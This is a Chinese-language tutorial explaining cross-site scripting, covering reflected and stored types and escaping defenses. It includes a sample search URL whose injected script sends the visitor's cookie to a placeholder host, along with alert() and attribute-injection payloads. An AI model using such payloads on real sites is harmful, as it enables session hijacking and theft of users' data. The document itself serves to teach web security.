## 跨站脚本攻击(Cross-site Script)
- <strong>说明</strong>：攻击者通过web页面插入恶意的script代码，当用户访问页面时，嵌入在页面里的script代码会被执行，窃取用户的敏感信息(例如获取用户的 Cookie、导航到恶意网站、携带木马等)，达到而已攻击的目的。
- <strong>本质</strong>：xss攻击其实是因为浏览器将用户的输入内容，错误地当成了js脚本执行，导致了不好的后果。
- <strong>要点</strong>：大部分的 XSS 漏洞都是由于没有处理好用户的输入，导致恶意脚本在浏览器中执行。任何输入提交数据的地方都有可能存在 XSS。

#### XSS攻击的攻击类型
* ##### Reflected XSS（基于反射的XSS攻击）
用户在页面输入框中输入数据，通过 get 或者 post 方法向服务器端传递数据，输入的数据一般是放在 URL 的 query string 中，或者是 form 表单中，如果服务端没有对这些数据进行过滤、验证或者编码，直接将用户输入的数据呈现出来，就可能会造成反射型 XSS。反射型 XSS 是非常普遍的，其危害程度通常较小，但是某些反射型 XSS 还是会造成严重后果的。
<strong>重点</strong>：黑客通常通过构造一个包含 XSS 代码的 URL，诱导用户点击链接，触发 XSS 代码，达到劫持访问、获取 cookies 的目的。
###### 场景示例：
```
1. 做个假设，当亚马逊在搜索书籍，搜不到书的时候显示提交的名称。

2. 在搜索框搜索内容，填入“<script>alert('handsome boy')</script>”, 点击搜索。

3. 当前端页面没有对返回的数据进行过滤，直接显示在页面上， 这时就会alert那个字符串出来。

4. 进而可以构造获取用户cookies的地址，通过QQ群或者垃圾邮件，来让其他人点击这个地址：

http://www.amazon.cn/search?name=<script>document.location='http://xxx/get?cookie='+document.cookie</script>

PS：这个地址当然是没效的，只是举例子而已。
```
###### 防范措施：
- 前端在显示服务端数据时候，不仅是标签内容需要过滤、转义，就连属性值也都可能需要。

- 后端接收请求时，验证请求是否为攻击请求，攻击则屏蔽。
```
标签：

<span><script>alert('handsome boy')</script></span>
转义

<span>&lt;script&gt;alert(&#39;handsome boy&#39;)&lt;/script&gt</span>
属性：

如果一个input的value属性值是

琅琊榜" onclick=javascript:alert('handsome boy')
就可能出现

<input type="text" value="琅琊榜" onclick=javascript:alert('handsome boy')">
点击input导致攻击脚本被执行，解决方式可以对script或者双引号进行过滤。
```
![反射型攻击](http://upload-images.jianshu.io/upload_images/11994763-4fb13f0a235e05b6?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
* ##### Stored XSS（基于存储的XSS攻击）
存储型攻击方式和反射型最大的区别就是不通过URL来传播，而是利用站点本身合法的存储结构，比如评论。任何用户都可以通过站点提供的接口提交评论内容，这些评论内容都被存储到服务器的数据库。当用户访问这些评论的时候，服务器从数据库提取内容插入到页面反馈给用户。如果评论内容本身是具备攻击性内容，用户无一幸免。
![存储型攻击](http://upload-images.jianshu.io/upload_images/11994763-e1f821758ee1d047?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
* ##### DOM-based or local XSS（基于DOM或本地的XSS攻击）



#### XSS脚本攻击案例
- [新浪微博XSS攻击](http://soft.yesky.com/security/156/30179156.shtml)
- [人人网遭受XSS攻击](https://www.freebuf.com/articles/6295.html)

#### 参考资料
* [Web 安全之 XSS](http://web.jobbole.com/94665/?utm_source=blog.jobbole.com&utm_medium=relatedPosts)
* [浏览器是如何解码的](http://xuelinf.github.io/2016/05/18/%E7%BC%96%E7%A0%81%E4%B8%8E%E8%A7%A3%E7%A0%81-%E6%B5%8F%E8%A7%88%E5%99%A8%E5%81%9A%E4%BA%86%E4%BB%80%E4%B9%88/)
